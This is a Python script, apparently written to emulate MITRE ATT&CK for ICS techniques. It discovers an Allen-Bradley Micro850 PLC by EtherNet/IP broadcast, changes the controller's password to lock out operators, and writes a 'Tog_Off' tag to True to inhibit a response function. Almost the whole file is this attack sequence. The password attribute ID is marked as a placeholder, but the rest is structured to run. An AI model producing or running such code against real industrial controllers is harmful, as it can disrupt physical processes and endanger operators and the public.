import pycomm3
import socket

# Configuration - Replace with actual PLC details if different from defaults
PLC_CPU_MODEL = "Micro850" # You can get this from the PLC properties
PLC_PROGRAM_NAME = "Prog1"
TARGET_VARIABLE = "Tog_Off" # The target variable for modification
DESIRED_VALUE = True       # The value to set the variable to
NEW_PASSWORD = "NewComplexPassword123!" # Replace with your desired password

# Function to discover the PLC IP address (Basic method - needs refinement for robust environments)
def discover_plc_ip(cpu_model_filter=PLC_CPU_MODEL):
    """
    Attempts to discover the PLC's IP address on the local network.
    This is a very basic discovery method and may not work in all network configurations.
    Refinement is necessary for production environments (e.g., using BOOTP/DHCP snooping).
    """
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', 0)) # Let the OS choose an available port
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    #Craft a simple CIP discovery packet. This needs to be adjusted based on PLC
    #manufacturer and discovery protocol
    cip_discovery_packet = b'\x63\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x04\x00' #Basic Ethernet/IP discovery packet
    sock.sendto(cip_discovery_packet, ('<broadcast>', 44818))  # Common Ethernet/IP port

    sock.settimeout(5) # Set a timeout for receiving a response

    try:
        data, addr = sock.recvfrom(1024)
        # Basic check - Look for the PLC model in the response.  Improve this!
        if cpu_model_filter.encode('utf-8') in data:
           print(f"Possible PLC IP address found: {addr[0]}")
           return addr[0]
        else:
            print("Received response, but PLC model doesn't match. Check the response structure")
            return None

    except socket.timeout:
        print("No PLC response received within the timeout.")
        return None
    finally:
        sock.close()


def change_plc_password(plc_ip, new_password):
    """
    Changes the PLC's password. This function implements the core of the MITRE technique.
    """
    try:
        with pycomm3.CIPDriver(plc_ip) as driver:
            print(f"Established connection with PLC at {plc_ip}")

            # Get PLC Security object
            security_object = driver.generic_message(
                service=0x4B,  # Get_Attribute_All Service
                class_code=0x77,  # Security Object Class Code
                instance_id=0x01,  # Default instance ID
                attribute_count=5
            )
            if security_object.Status == 0:
                print("Successfully retrieved PLC Security Object.")
                #for idx, att in enumerate(security_object.Value):
                #    print(f"\tAtt: {idx}, Type: {type(att)}, Value: {att}")
            else:
                print(f"Error Retrieving Security Object: {security_object.Status}")
                return False

            # Prepare the password change request - Requires the correct attribute ID
            # **IMPORTANT**: The attribute ID and data structure for setting passwords
            # is highly vendor-specific. The following is a placeholder. You MUST consult
            # the Micro850 documentation to find the correct values.
            #  The example below changes attribute ID 100 (PLACEHOLDER) with new_password
            change_password_request = driver.generic_message(
                service=0x0E,  # Set_Attribute_Single
                class_code=0x77, # Security Object
                instance_id=0x01,
                attribute_id=100, # Attribute ID (PLACEHOLDER - CHECK DOCUMENTATION)
                request_data=new_password.encode('utf-8')  # Password data
            )

            if change_password_request.Status == 0:
                print(f"Password successfully changed to {new_password}")
                return True
            else:
                print(f"Password change failed: {change_password_request.Status}")
                return False

    except Exception as e:
        print(f"An error occurred: {e}")
        return False


def modify_plc_variable(plc_ip, program_name, variable_name, new_value):
    """
    Modifies a PLC variable.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as driver:
            print(f"Established connection with PLC at {plc_ip}")
            # Build the tag path
            tag_path = f"{program_name}.{variable_name}"  #Construct the correct tag name for ST programs
            # Write the new value
            driver.write((tag_path, new_value))
            print(f"Successfully wrote {new_value} to {tag_path}")
            return True

    except Exception as e:
        print(f"An error occurred: {e}")
        return False



def main():
    """
    Main function to orchestrate the password change and variable modification.
    """
    print("Starting PLC interaction script...")

    # 1. Discover the PLC IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("Failed to discover PLC IP address. Exiting.")
        return

    print(f"Using PLC IP Address: {plc_ip}")

    # 2. Change the PLC Password
    if change_plc_password(plc_ip, NEW_PASSWORD):
        print("Successfully changed the PLC password.")
    else:
        print("Failed to change the PLC password. Exiting.")
        return

    # 3. Modify the target PLC variable (Inhibit Response Function)
    if modify_plc_variable(plc_ip, PLC_PROGRAM_NAME, TARGET_VARIABLE, DESIRED_VALUE):
        print(f"Successfully set {TARGET_VARIABLE} to {DESIRED_VALUE}")
    else:
        print(f"Failed to set {TARGET_VARIABLE} to {DESIRED_VALUE}. Check tag name and data type.")


if __name__ == "__main__":
    main()